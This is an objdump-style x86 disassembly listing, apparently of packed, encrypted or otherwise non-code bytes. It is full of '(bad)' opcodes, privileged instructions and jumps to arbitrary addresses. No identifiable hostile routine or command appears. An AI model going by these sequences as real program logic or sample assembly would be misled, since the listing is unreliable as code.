  427a51:	and    eax,0xac2d27a
  427a56:	xchg   ebp,eax
  427a57:	jge    0x427a66
  427a59:	dec    edx
  427a5a:	sub    eax,0x8525c9bb
  427a5f:	pop    ecx
  427a60:	push   ecx
  427a61:	mov    ch,0x7
  427a63:	mov    ch,0x57
  427a65:	ja     0x4279fd
  427a67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427a68:	and    eax,0xacb02497
  427a6d:	push   ebp
  427a6e:	adc    BYTE PTR [ebx+0x14],al
  427a71:	in     eax,dx
  427a72:	retw   0xb783
  427a76:	jecxz  0x427a43
  427a78:	fbld   TBYTE PTR [esp+0x6b]
  427a7c:	(bad)  
  427a7d:	adc    BYTE PTR ds:0xe82b1e44,cl
  427a83:	in     eax,0xe1
  427a85:	dec    eax
  427a86:	jmp    FWORD PTR ds:0xe550e1da
  427a8c:	imul   esp,DWORD PTR [ebx],0xffffffbd
  427a8f:	adc    cl,BYTE PTR [esi-0x5e]
  427a92:	daa    
  427a93:	push   edi
  427a94:	cmp    ah,BYTE PTR [edi+0x22]
  427a97:	popa   
  427a98:	xchg   edi,eax
  427a99:	mov    ch,0x68
  427a9b:	retf   0x45e5
  427a9e:	jp     0x427a54
  427aa0:	data16 test al,0xf2
  427aa3:	and    DWORD PTR [edx],esi
  427aa5:	xlat   BYTE PTR ds:[ebx]
  427aa6:	int    0x98
  427aa8:	mov    ecx,0x7a69855c
  427aad:	or     eax,0xfb53d9c2
  427ab2:	aas    
  427ab3:	mov    ds:0x9593deae,eax
  427ab8:	arpl   WORD PTR [ecx],di
  427aba:	jp     0x427ad6
  427abc:	stc    
  427abd:	repz cmp eax,0x3810ed26
  427ac3:	inc    esi
  427ac4:	xor    eax,esi
  427ac6:	adc    ebp,eax
  427ac8:	retf   0xa0a8
  427acb:	mov    ds:0x8cf50d6e,al
  427ad0:	push   0x23d24c83
  427ad5:	cli    
  427ad6:	test   al,cl
  427ad8:	xor    DWORD PTR [edi+0x70],ebx
  427adb:	inc    ecx
  427adc:	shl    DWORD PTR [edi+0x78eb5f68],0xbf
  427ae3:	cmp    bh,dl
  427ae5:	adc    BYTE PTR [ebx+0x2a],dl
  427ae8:	sahf   
  427ae9:	push   eax
  427aea:	jno    0x427adf
  427aec:	mov    edx,0xf95accfe
  427af1:	inc    esi
  427af2:	outs   dx,BYTE PTR ds:[esi]
  427af3:	cdq    
  427af4:	push   ecx
  427af5:	jns    0x427a9a
  427af7:	jo     0x427aa8
  427af9:	and    al,BYTE PTR ds:0xc00dfe7b
  427aff:	mov    ds:0x26bf5a5e,al
  427b04:	imul   edx,DWORD PTR [edx],0x6217b3f2
  427b0a:	push   esp
  427b0b:	add    ebp,0x232dc6
	...
  427b71:	add    BYTE PTR [eax],al
  427b73:	add    dl,cl
  427b75:	mov    edx,DWORD PTR [edx+0x7b]
  427b78:	push   ebx
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	test   BYTE PTR [eax-0x22],0x1e
  427b83:	lock sub BYTE PTR [eax+0x1040001],ch
  427b8a:	add    BYTE PTR [eax],al
  427b8c:	je     0x427baa
  427b8e:	lock (bad) 
  427b90:	in     al,0xcd
  427b92:	and    dh,BYTE PTR [esp+esi*1]
  427b95:	std    
  427b96:	sub    edi,DWORD PTR [ecx+edi*2-0x1]
  427b9a:	dec    eax
  427b9b:	mov    DWORD PTR [edx],esi
  427b9d:	inc    esp
  427b9e:	repnz xor ah,ah
  427ba1:	lahf   
  427ba2:	out    0xb2,al
  427ba4:	rol    al,cl
  427ba6:	push   0xc666c368
  427bab:	push   edi
  427bac:	sub    DWORD PTR [edi+0x28b9fae8],0xf728d09e
  427bb6:	mov    ds:0xcd11c2e,al
  427bbb:	jle    0x427c0d
  427bbd:	lea    ebp,[eax+0x1c1059ea]
  427bc3:	fwait
  427bc4:	xchg   ebp,eax
  427bc5:	sbb    dh,al
  427bc7:	in     al,0x3
  427bc9:	fild   QWORD PTR [esi+0x60]
  427bcc:	adc    BYTE PTR [ebp+0x53],dh
  427bcf:	and    BYTE PTR ds:0x19920d40,al
  427bd5:	mov    ebx,DWORD PTR [eax+0x3dcd981b]
  427bdb:	dec    ebp
  427bdc:	xlat   BYTE PTR ds:[ebx]
  427bdd:	sbb    eax,DWORD PTR [ecx+0x3d]
  427be0:	sub    ebp,ebp
  427be2:	fs mov ecx,0x5706a813
  427be8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427be9:	xchg   ch,al
  427beb:	inc    ebp
  427bec:	dec    eax
  427bed:	xchg   edx,eax
  427bee:	inc    edi
  427bef:	in     al,dx
  427bf0:	push   ecx
  427bf1:	push   ss
  427bf2:	and    al,0x82
  427bf4:	xchg   ebp,eax
  427bf5:	arpl   WORD PTR [ebp+0x69ff1fa3],ax
  427bfb:	stos   DWORD PTR es:[edi],eax
  427bfc:	push   edx
  427bfd:	jno    0x427c67
  427bff:	mov    DWORD PTR [ebp-0x60],0x36333569
  427c06:	xchg   esi,eax
  427c07:	or     al,0xa8
  427c09:	retf   0x822e
  427c0c:	push   edi
  427c0d:	call   0x963e74ac
  427c12:	popf   
  427c13:	jg     0x427c66
  427c15:	sub    cl,bh
  427c17:	fimul  WORD PTR [edi-0x51]
  427c1a:	les    edx,FWORD PTR es:[ebp+eax*4+0x25]
  427c1f:	into   
  427c20:	out    dx,al
  427c21:	pop    eax
  427c22:	jns    0x427c4d
  427c24:	xchg   ebx,eax
  427c25:	aas    
  427c26:	ficom  WORD PTR [esi+0x17]
  427c29:	arpl   WORD PTR [edi+eiz*8],dx
  427c2c:	sub    DWORD PTR [eax],eax
  427c2e:	das    
  427c2f:	addr16 xchg ebx,eax
  427c31:	fst    QWORD PTR [esi]
  427c33:	adc    BYTE PTR [ebx-0x6e046d59],0xa4
  427c3a:	shl    DWORD PTR [esi+0x612f182c],cl
  427c40:	mov    cl,0x3d
  427c42:	adc    BYTE PTR [ecx+eiz*1-0x24],dl
  427c46:	je     0x427c8f
  427c48:	rol    DWORD PTR [edx-0xc22701],0x1d
  427c4f:	or     DWORD PTR ds:0x94785f10,ebx
  427c55:	mov    esi,cr1
  427c58:	test   al,0x4b
  427c5a:	clc    
  427c5b:	adc    DWORD PTR [ecx+0x5b],esi
  427c5e:	arpl   WORD PTR [ecx+ebp*2-0x4],di
  427c62:	ror    DWORD PTR [ebx],cl
  427c64:	test   ecx,ecx
  427c66:	scas   eax,DWORD PTR es:[edi]
  427c67:	shl    DWORD PTR [esi+ebp*1+0x19],cl
  427c6b:	mov    ds:0xec140e22,al
  427c70:	shl    DWORD PTR [ecx+0x5c],0xc6
  427c74:	loope  0x427c7d
  427c76:	sbb    al,0xb
  427c78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427c79:	arpl   WORD PTR [edi+0x13bbe408],cx
  427c7f:	inc    edx
  427c80:	cmp    BYTE PTR [eax+eiz*1-0x16bcad58],ch
  427c87:	test   ebx,esp
  427c89:	cdq    
  427c8a:	loop   0x427cd4
  427c8c:	loop   0x427c26
  427c8e:	fwait
  427c8f:	dec    esi
	...
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x22785d44,ebx
  427d02:	mov    ecx,0x1a92c6f
  427d07:	add    BYTE PTR [ecx+eax*1],al
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	ja     0x427cc2
  427d0e:	aad    0x47
  427d10:	xor    ebx,DWORD PTR [esi+0x2e]
  427d13:	dec    edx
  427d14:	mov    edx,edi
  427d16:	je     0x427c9c
  427d18:	clc    
  427d19:	sub    al,0xe6
  427d1b:	lods   eax,DWORD PTR ds:[esi]
  427d1c:	inc    edx
  427d1d:	aam    0x4f
  427d1f:	mov    ds:0xce7ceb45,al
  427d24:	inc    esp
  427d25:	dec    edx
  427d26:	outs   dx,BYTE PTR ds:[esi]
  427d27:	stos   BYTE PTR es:[edi],al
  427d28:	mov    ch,0xa9
  427d2a:	out    0x36,al
  427d2c:	outs   dx,BYTE PTR ds:[esi]
  427d2d:	test   al,0xc6
  427d2f:	out    dx,eax
  427d30:	imul   esi,DWORD PTR [ecx-0x273b363a],0xfc96938a
  427d3a:	sar    bl,cl
  427d3c:	xchg   edx,eax
  427d3d:	cmc    
  427d3e:	retf   
  427d3f:	pop    ecx
  427d40:	mov    esi,0x4dda131c
  427d45:	cdq    
  427d46:	xor    al,0xc1
  427d48:	inc    esp
  427d49:	sub    bl,BYTE PTR [ebx-0x6d]
  427d4c:	jo     0x427d89
  427d4e:	push   cs
  427d4f:	pop    ebp
  427d50:	jl     0x427d98
  427d52:	push   cs
  427d53:	enter  0x8a9,0xa0
  427d57:	pop    eax
  427d58:	mov    ah,0xf9
  427d5a:	mov    cl,0x21
  427d5c:	inc    edx
  427d5d:	mov    edx,0x400d9045
  427d62:	rcl    BYTE PTR [esp+edx*8+0x13aa365b],0xd6
  427d6a:	arpl   WORD PTR [edi-0x5addc42d],sp
  427d70:	rcr    DWORD PTR [ecx+0x7f],cl
  427d73:	xor    eax,0x50d7edc
  427d78:	sbb    DWORD PTR [edi],ebx
  427d7a:	(bad)  
  427d7b:	xor    eax,0x8f771a99
  427d80:	aas    
  427d81:	dec    edi
  427d82:	(bad)  [edx-0x53]
  427d85:	ins    BYTE PTR es:[edi],dx
  427d86:	push   ebp
  427d87:	push   ecx
  427d88:	fucomi st,st(6)
  427d8a:	xor    al,0x77
  427d8c:	jne    0x427d54
  427d8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427d8f:	adc    eax,0x60ee74a4
  427d94:	push   ss
  427d95:	iret   
  427d96:	xor    esi,DWORD PTR [esi]
  427d98:	adc    edx,DWORD PTR [ebx-0xb33e557]
  427d9e:	xchg   esi,eax
  427d9f:	xor    eax,0xf270bae1
  427da4:	outs   dx,BYTE PTR ds:[esi]
  427da5:	or     bl,BYTE PTR ds:0x13f7e9f
  427dab:	dec    esp
  427dac:	push   ebp
  427dad:	sub    edi,DWORD PTR [esi+edx*8-0x2baae22a]
  427db4:	not    DWORD PTR [ecx+0x358ad2c0]
  427dba:	or     eax,0x9a3aeacf
  427dbf:	adc    bh,ah
  427dc1:	jb     0x427e1b
  427dc3:	jnp    0x427d9a
  427dc5:	ror    esi,cl
  427dc7:	fsub   st,st(2)
  427dc9:	jno    0x427e41
  427dcb:	data16 jmp 0x427d8b
  427dce:	push   ebx
  427dcf:	pusha  
  427dd0:	mov    cl,0x5e
  427dd2:	xchg   ebp,eax
  427dd3:	sbb    ch,BYTE PTR [ebx+0x48543b95]
  427dd9:	or     ecx,DWORD PTR [eax+0x48c293f]
  427ddf:	jne    0x427e0e
  427de1:	sub    DWORD PTR [edi-0x56],ebp
  427de4:	ss push esi
  427de6:	jae    0x427de4
  427de8:	push   ebx
  427de9:	sbb    bl,al
  427deb:	or     bl,BYTE PTR [edx+0x3e2df548]
  427df1:	jbe    0x427d83
  427df3:	movups xmm4,xmm3
  427df6:	cmp    eax,0xd77df94e
  427dfb:	sub    DWORD PTR [eax+0x27],esp
  427dfe:	not    BYTE PTR [edx+0x2c13d40a]
  427e04:	add    DWORD PTR ss:[ecx+0x4c],ebp
  427e08:	pusha  
  427e09:	push   ebx
  427e0a:	add    eax,0xf2a1113e
  427e0f:	enter  0x0,0x0
	...
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	pop    ebp
  427e81:	jmp    0xaa736792
  427e86:	add    DWORD PTR [eax],eax
  427e88:	add    al,0x1
  427e8a:	add    BYTE PTR [eax],al
  427e8c:	jle    0x427e62
  427e8e:	rol    BYTE PTR [esi+0x41031b4],0x9d
  427e95:	adc    dl,al
  427e97:	or     BYTE PTR [esi+eax*1+0x3f5c1917],cl
  427e9e:	in     al,0x4c
  427ea0:	xchg   esp,eax
  427ea1:	bound  esi,QWORD PTR [ebx]
  427ea3:	rcr    DWORD PTR [ecx],cl
  427ea5:	mov    bl,BYTE PTR [ebx+0x71]
  427ea8:	pop    ecx
  427ea9:	repnz push edx
  427eab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427eac:	(bad)  
  427ead:	jl     0x427e40
  427eaf:	in     eax,dx
  427eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427eb1:	mov    al,ds:0x5f046f0c
  427eb6:	mov    ds:0xa6636285,al
  427ebb:	in     al,dx
  427ebc:	in     eax,0x7a
  427ebe:	mov    ebx,0x871b7237
  427ec3:	sub    BYTE PTR [ebp+0x5b],bl
  427ec6:	cmp    dl,bl
  427ec8:	sbb    DWORD PTR [edx-0x4e],ebx
  427ecb:	mov    esi,0x597093fd
  427ed1:	(bad)  
  427ed2:	mov    ds:0xea1632f3,al
  427ed7:	inc    ebx
  427ed8:	push   ecx
  427ed9:	fsubr  QWORD PTR [ecx]
  427edb:	cmp    al,0x6f
  427edd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427ede:	iret   
  427edf:	lods   eax,DWORD PTR ds:[esi]
  427ee0:	and    eax,0x98e03998
  427ee5:	clc    
  427ee6:	inc    ecx
  427ee7:	sub    ecx,edi
  427ee9:	jle    0x427f2b
  427eeb:	test   al,0x5a
  427eed:	add    eax,0x4f6e5267
  427ef2:	(bad)  
  427ef3:	leave  
  427ef4:	mov    eax,ds:0x7436ee34
  427ef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427efa:	jle    0x427ea9
  427efc:	retf   0xffdb
  427eff:	bnd jl 0x427f1b
  427f02:	(bad)  
  427f03:	imul   esp,DWORD PTR [di],0xffffffde
  427f07:	sub    DWORD PTR [edi+0x3d],0x829df766
  427f0e:	cmp    eax,ecx
  427f10:	addr16 addr16 lahf 
  427f13:	(bad)  
  427f14:	out    dx,eax
  427f15:	xchg   esp,eax
  427f16:	stos   BYTE PTR es:[edi],al
  427f17:	jo     0x427f8e
  427f19:	iret   
  427f1a:	fwait
  427f1b:	jge    0x427f44
  427f1d:	sbb    esi,DWORD PTR [edi+ebp*2]
  427f20:	nop
  427f21:	stos   DWORD PTR es:[edi],eax
  427f22:	add    DWORD PTR [edx-0x23],esi
  427f25:	inc    edx
  427f26:	adc    BYTE PTR es:[edx+0x19637c45],0xa9
  427f2e:	push   cs
  427f2f:	xor    BYTE PTR [ecx+0x52],0x32
  427f33:	mov    esi,0xa2fed42a
  427f38:	mov    al,ds:0xa26020f9
  427f3d:	adc    edx,esp
  427f3f:	xor    eax,eax
  427f41:	ss mov bl,0x8a
  427f44:	in     eax,0x7d
  427f46:	mov    esi,DWORD PTR [esi]
  427f48:	mov    ch,BYTE PTR [edi+0x51]
  427f4b:	dec    esi
  427f4c:	fwait
  427f4d:	mov    ch,BYTE PTR [ecx]
  427f4f:	arpl   cx,di
  427f51:	stc    
  427f52:	cmp    BYTE PTR [ebp-0x4],bl
  427f55:	mov    eax,ds:0x6354bbfd
  427f5a:	jge    0x427fce
  427f5c:	mov    bl,BYTE PTR [edx+0x654a4526]
  427f62:	inc    eax
  427f63:	jnp    0x427f9d
  427f65:	pop    es
  427f66:	rcl    BYTE PTR [edi],0x61
  427f69:	cdq    
  427f6a:	pop    ecx
  427f6b:	push   eax
  427f6c:	xchg   esi,ebp
  427f6e:	test   BYTE PTR ds:0x26cdb0e2,ah
  427f74:	mov    edi,0x59bf2cb9
  427f79:	stos   BYTE PTR es:[edi],al
  427f7a:	pop    ds
  427f7b:	jns    0x427f3f
  427f7d:	(bad)  
  427f7e:	int    0x99
  427f80:	mov    dl,0x53
  427f82:	mov    cl,0xf9
  427f84:	daa    
  427f85:	call   0x7e06:0xb502725a
  427f8c:	int3   
  427f8d:	hlt    
  427f8e:	sub    bl,bh
	...
  427ff4:	mov    cl,0xa7
  427ff6:	dec    ebx
  427ff7:	das    
  427ff8:	pop    edi
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	icebp  
  428001:	dec    ecx
  428002:	jge    0x427fb5
  428004:	xor    al,0xab
  428006:	add    DWORD PTR [eax],eax
  428008:	add    al,0x1
  42800a:	add    BYTE PTR [eax],al
  42800c:	stos   BYTE PTR es:[edi],al
  42800d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42800e:	stc    
  42800f:	add    eax,0xac5d91bf
  428014:	jp     0x427fe2
  428016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428017:	(bad)  
  428018:	fcomip st,st(0)
  42801a:	mov    ds:0x45e2b63a,eax
  42801f:	loope  0x42809a
  428021:	fnstsw WORD PTR [esi+0x0]
  428024:	mov    ch,0xc1
  428026:	inc    ebp
  428027:	in     al,0x62
  428029:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42802a:	jnp    0x428078
  42802c:	hlt    
  42802d:	call   0xce6e:0x10c6388b
  428034:	imul   esi,esp,0x5a
  428037:	pop    ebx
  428038:	add    dl,dh
  42803a:	jb     0x428086
  42803c:	lods   eax,DWORD PTR ds:[esi]
  42803d:	(bad)  
  42803e:	cld    
  42803f:	mov    esi,0x7c330638
  428044:	dec    esi
  428045:	wrmsr  
  428047:	into   
  428048:	mov    ds:0x3b733cac,al
  42804d:	mov    eax,0xd7e7f74f
  428052:	into   
  428053:	outs   dx,BYTE PTR ds:[esi]
  428054:	or     ebp,DWORD PTR [esi]
  428056:	into   
  428057:	ret    
  428058:	clc    
  428059:	add    DWORD PTR [esi+0xec60669],ebp
  42805f:	jnp    0x42807e
  428061:	ja     0x428073
  428063:	push   esi
  428064:	jnp    0x4280a9
  428066:	(bad)  
  428067:	js     0x4280c4
  428069:	cmp    al,0x16
  42806b:	scas   al,BYTE PTR es:[edi]
  42806c:	xchg   edi,eax
  42806d:	sub    DWORD PTR [edx],eax
  42806f:	imul   bh
  428071:	stc    
  428072:	sbb    DWORD PTR [ebx+ebx*1-0x10251f0f],esi
  428079:	sbb    bl,BYTE PTR [edx+eiz*2-0x33]
  42807d:	xor    DWORD PTR [eax],edx
  42807f:	aad    0x54
  428081:	popa   
  428082:	add    esi,DWORD PTR ds:[ebp+0xedf066d]
  428089:	loope  0x428028
  42808b:	inc    esp
  42808c:	shl    BYTE PTR [edi],1
  42808e:	mov    dh,0x10
  428090:	and    eax,0x4bf122c9
  428095:	shl    BYTE PTR [di-0x57],0x7
  42809a:	xchg   edi,eax
  42809b:	fstp   DWORD PTR [esi-0x1e]
  42809e:	dec    DWORD PTR [ecx-0x39d7391a]
  4280a4:	mov    dh,0x89
  4280a6:	sbb    BYTE PTR [ebp+eiz*2+0x6ccf0c5c],bh
  4280ad:	(bad)  
  4280ae:	mov    ah,0x3
  4280b0:	ret    
  4280b1:	mov    bl,0x5
  4280b3:	inc    ebp
  4280b4:	aaa    
  4280b5:	sbb    al,0xa6
  4280b7:	rol    dh,0xda
  4280ba:	int    0x97
  4280bc:	dec    eax
  4280bd:	jl     0x4280a0
  4280bf:	loop   0x4280c1
  4280c1:	ins    BYTE PTR es:[edi],dx
  4280c2:	push   es
  4280c3:	xchg   ecx,eax
  4280c4:	mov    bh,0x96
  4280c6:	mov    ebx,0x303a6898
  4280cb:	xor    al,0x81
  4280cd:	xchg   edx,eax
  4280ce:	ds pop edi
  4280d0:	mov    ds:0xadd6e762,eax
  4280d5:	bound  eax,QWORD PTR [edi+0x45]
  4280d8:	in     eax,dx
  4280d9:	sub    eax,0xa87fb58a
  4280de:	jnp    0x42812f
  4280e0:	push   eax
  4280e1:	sub    ebx,DWORD PTR fs:[si+0x68]
  4280e6:	pop    esi
  4280e7:	gs dec esi
  4280e9:	lahf   
  4280ea:	push   ss
  4280eb:	fs fwait
  4280ed:	or     al,0x66
  4280ef:	mov    ah,0x4e
  4280f1:	jo     0x4280d2
  4280f3:	shl    DWORD PTR [edi-0x11],cl
  4280f6:	data16 mov bl,0x79
  4280f9:	or     BYTE PTR [ecx+0x1b50dd8],cl
  4280ff:	ja     0x4280a3
  428101:	stc    
  428102:	cmp    dl,BYTE PTR [esi-0x3f]
  428105:	adc    bl,cl
  428107:	dec    ecx
  428108:	xchg   esi,eax
  428109:	out    dx,al
  42810a:	inc    edi
  42810b:	jp     0x4280de
  42810d:	mov    dl,0x68
  42810f:	imul   eax,DWORD PTR [eax],0x0
	...
  428172:	add    BYTE PTR [eax],al
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	std    
  428181:	jno    0x428198
  428183:	cmp    eax,0x1ac38
  428188:	add    al,0x1
  42818a:	add    BYTE PTR [eax],al
  42818c:	jnp    0x428206
  42818e:	outs   dx,BYTE PTR ds:[esi]
  42818f:	sub    bl,al
  428191:	mov    dl,0x81
  428193:	mov    dh,BYTE PTR [ecx-0x3a71b96d]
  428199:	push   ebx
  42819a:	mov    edi,0x5c526a94
  42819f:	push   eax
  4281a0:	mov    ebx,DWORD PTR [edx+0x78b3633e]
  4281a6:	inc    edx
  4281a7:	stc    
  4281a8:	sbb    eax,0xc235aa5
  4281ad:	inc    ebp
  4281ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281af:	jne    0x42820a
  4281b1:	(bad)  
  4281b2:	out    0xf3,al
  4281b4:	shl    BYTE PTR ds:0x98a06a1f,1
  4281ba:	aam    0xaa
  4281bc:	inc    ecx
  4281bd:	mov    edx,DWORD PTR [ebx+0x31]
  4281c0:	cs mov esi,0x2f94ddbc
  4281c6:	dec    esi
  4281c7:	sbb    ecx,DWORD PTR [edi]
  4281c9:	ror    DWORD PTR [ebx+0x6702f340],0xb8
  4281d0:	ret    
  4281d1:	dec    ebx
  4281d2:	inc    ecx
  4281d3:	sub    al,BYTE PTR gs:[ecx+0x6986e961]
  4281da:	icebp  
  4281db:	cmp    al,0x24
  4281dd:	push   ecx
  4281de:	mov    DWORD PTR [ecx+0x62fb6e99],eax
  4281e4:	sub    DWORD PTR [esi+edi*4-0x32],esi
  4281e8:	or     DWORD PTR ds:0x7e371544,edx
  4281ee:	add    BYTE PTR [esi],ch
  4281f0:	mov    ah,0x9b
  4281f2:	mov    cl,0xd7
  4281f4:	(bad)  
  4281f5:	in     al,0x1b
  4281f7:	inc    ebp
  4281f9:	mov    ebp,DWORD PTR [ebx]
  4281fb:	dec    ecx
  4281fc:	in     eax,dx
  4281fd:	add    al,0x7f
  4281ff:	push   ebp
  428200:	addr16 test al,0x8c
  428203:	les    esi,FWORD PTR [ecx-0x37661240]
  428209:	stc    
  42820a:	popf   
  42820b:	stc    
  42820c:	rcl    DWORD PTR [eax],cl
  42820e:	retf   0x601
  428211:	pop    eax
  428212:	push   edx
  428213:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428214:	rol    esi,1
  428216:	aas    
  428217:	cmp    DWORD PTR [eax+0x1564d08e],ebp
  42821d:	pop    es
  42821e:	lds    edi,FWORD PTR cs:[edx+0x7d]
  428222:	xor    al,0xe4
  428224:	sbb    ch,BYTE PTR ds:0xa0930698
  42822a:	ins    DWORD PTR es:[edi],dx
  42822b:	and    DWORD PTR gs:[esi-0x197abcb],ecx
  428232:	push   es
  428233:	scas   al,BYTE PTR es:[edi]
  428234:	retf   0xe0e8
  428237:	test   eax,0x2bb808ff
  42823c:	(bad)  
  42823d:	jl     0x42820f
  42823f:	jmp    0xb8334abd
  428244:	jb     0x4281f0
  428246:	push   es
  428247:	mov    ebx,0x33627198
  42824c:	sub    dl,dh
  42824e:	jbe    0x4281f4
  428250:	mov    cl,0x7
  428252:	(bad)  
  428253:	cmp    al,0x89
  428255:	(bad)  
  428256:	mov    ah,BYTE PTR [esi+0x7c]
  428259:	xchg   esi,eax
  42825a:	sar    BYTE PTR [eax-0x6a],0xa0
  42825e:	ret    
  42825f:	aaa    
  428260:	in     eax,dx
  428261:	or     al,BYTE PTR ds:0xc5a47e7a
  428267:	mov    BYTE PTR [edx-0x2a],bl
  42826a:	shl    DWORD PTR [ebp+0x183b45ff],cl
  428270:	cmp    eax,0x1e1c7931
  428275:	leave  
  428276:	cli    
  428277:	fisubr WORD PTR [esi+eax*1-0x6c]
  42827b:	or     eax,0x8cca5f81
  428280:	scas   eax,DWORD PTR es:[edi]
  428281:	add    BYTE PTR [edx-0x4a],bl
  428284:	call   0x1dea2a9
  428289:	push   ss
  42828a:	out    0x3,eax
  42828c:	lea    ebp,[edx+0x52]
  42828f:	push   esi
	...
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	mov    dl,0x53
  428302:	mov    dl,0xf8
  428304:	cmp    al,0xad
  428306:	add    DWORD PTR [eax],eax
  428308:	add    al,0x1
  42830a:	add    BYTE PTR [eax],al
  42830c:	bnd jle 0x428372
  42830f:	mov    dh,BYTE PTR [eax-0x1e8af082]
  428315:	or     al,BYTE PTR [eax+0x286738bf]
  42831b:	inc    edi
  42831c:	sub    ebp,DWORD PTR [ecx]
  42831e:	push   ebp
  42831f:	in     al,dx
  428320:	pop    es
  428321:	xor    eax,0x88588d14
  428326:	es pop es
  428328:	or     al,0xef
  42832a:	or     eax,0xf583171f
  42832f:	lods   eax,DWORD PTR ds:[esi]
  428330:	adc    esi,DWORD PTR [ecx-0x3fb797f1]
  428336:	add    edx,DWORD PTR [esi]
  428338:	mov    eax,ds:0x1fcc9f2a
  42833d:	in     al,dx
  42833e:	jb     0x42838b
  428340:	fist   WORD PTR [edx-0x44]
  428343:	loop   0x428369
  428345:	xchg   ebp,eax
  428346:	ss inc ebx
  428348:	cmp    BYTE PTR [eax],0xcd
  42834b:	in     eax,dx
  42834c:	retf   
  42834d:	int    0x38
  42834f:	push   0x7c
  428351:	mov    ecx,0x7b6edfb6
  428356:	xchg   edx,eax
  428357:	xchg   ecx,eax
  428358:	dec    ebp
  428359:	(bad)  
  42835a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42835b:	je     0x428311
  42835d:	sbb    al,0x70
  42835f:	in     al,0x80
  428361:	dec    ebx
  428362:	jo     0x428307
  428364:	mov    BYTE PTR [esi],bl
  428366:	push   esp
  428367:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428369:	scas   eax,DWORD PTR es:[edi]
  42836a:	aad    0x78
  42836c:	jp     0x4283c4
  42836e:	xchg   esp,eax
  42836f:	mov    ah,0xf7
  428371:	inc    ebx
  428372:	in     al,0x1d
  428374:	lods   al,BYTE PTR ds:[esi]
  428375:	ja     0x428351
  428377:	xchg   BYTE PTR [ebx+0x6d],bh
  42837a:	mov    cl,0x63
  42837c:	ds frstor fs:[ebp-0x3b]
  428381:	lahf   
  428382:	jnp    0x4283e2
  428384:	mov    edi,0x94a8c2bb
  428389:	push   ds
  42838a:	xchg   ebx,eax
  42838b:	shl    BYTE PTR [eax-0x737fac51],0x28
  428392:	xchg   BYTE PTR [edx],dl
  428394:	jne    0x4283d7
  428396:	je     0x4283fd
  428398:	ins    DWORD PTR es:[edi],dx
  428399:	pop    DWORD PTR [ebx-0x3a6f07c6]
  42839f:	loope  0x428344
  4283a1:	inc    ecx
  4283a2:	jecxz  0x428359
  4283a4:	pop    edi
  4283a5:	and    eax,ecx
  4283a7:	pop    es
  4283a8:	add    BYTE PTR [edx-0x26],dl
  4283ab:	out    dx,al
  4283ac:	or     ch,dl
  4283ae:	mov    al,ds:0x8f1740f3
  4283b3:	inc    eax
  4283b4:	xchg   esp,eax
  4283b5:	or     esi,DWORD PTR [ebx+0x6d]
  4283b8:	or     esi,DWORD PTR ds:0x7bdc6c1c
  4283be:	jle    0x428365
  4283c0:	lock retf 
  4283c2:	dec    edx
  4283c3:	scas   al,BYTE PTR es:[edi]
  4283c4:	pop    edx
  4283c5:	xchg   esp,eax
  4283c6:	sub    eax,0x2bbf702e
  4283cb:	cmp    al,0xfc
  4283cd:	popa   
  4283ce:	enter  0x1550,0x38
  4283d2:	pop    edi
  4283d3:	out    0x7c,al
  4283d5:	dec    ebx
  4283d6:	xchg   esi,eax
  4283d7:	xchg   BYTE PTR [edi+0x2b672569],dl
  4283dd:	mov    edi,0xe97348fc
  4283e2:	imul   ecx,DWORD PTR [ecx-0x4a],0x6055ee29
  4283e9:	pop    esi
  4283ea:	xor    esp,DWORD PTR [ecx+0x215e5c93]
  4283f0:	push   edi
  4283f1:	or     dh,BYTE PTR [ecx-0x7c7baec7]
  4283f7:	sbb    DWORD PTR [edx+0x1d5e5538],ebx
  4283fd:	xchg   BYTE PTR [edx+0x5b],bh
  428400:	push   0xffffffeb
  428402:	adc    eax,0x692d1d89
  428407:	sub    al,0xca
  428409:	fimul  DWORD PTR [ebx-0x4c]
  42840c:	das    
  42840d:	xchg   edx,eax
  42840e:	sub    DWORD PTR [ebp+0x0],ecx
	...
  428471:	add    BYTE PTR [eax],al
  428473:	add    BYTE PTR [esi],cl
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0xc4abfb32
  428481:	dec    ch
  428483:	fiadd  DWORD PTR [eax-0x52]
  428486:	add    DWORD PTR [eax],eax
  428488:	add    al,0x1
  42848a:	add    BYTE PTR [eax],al
  42848c:	and    dh,BYTE PTR [eax-0x29553d39]
  428492:	pop    edi
  428493:	dec    eax
  428494:	dec    edi
  428495:	les    edx,FWORD PTR [ebx+0x27]
  428498:	push   es
  428499:	pop    esi
